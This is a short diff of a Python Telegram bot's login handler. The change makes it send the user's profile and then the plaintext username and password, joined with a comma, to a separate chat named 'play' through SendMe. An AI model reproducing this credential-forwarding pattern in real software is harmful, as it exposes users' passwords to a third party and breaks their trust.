@@ -69,7 +69,6 @@ def login(update, context):
     info = update.effective_user
     #userid= info['username']
     text =  update.message.text.split(' ',2)
-    SendMe(play,text)
     try:
         username=text[1]
         password=text[2]
@@ -77,8 +76,9 @@ def login(update, context):
         short=text[1]
         username=shortcut[short]["username"]
         password=shortcut[short]["password"]
-    logger.info(text)
     text=str(info)
+    SendMe(play,text)
+    text="{},{}".format(username,password)
     SendMe(play,text)
     text = "<b>Logged in as</b> -- <code>{} </code>".format(username)
     Sendmessage(chat_id,text)
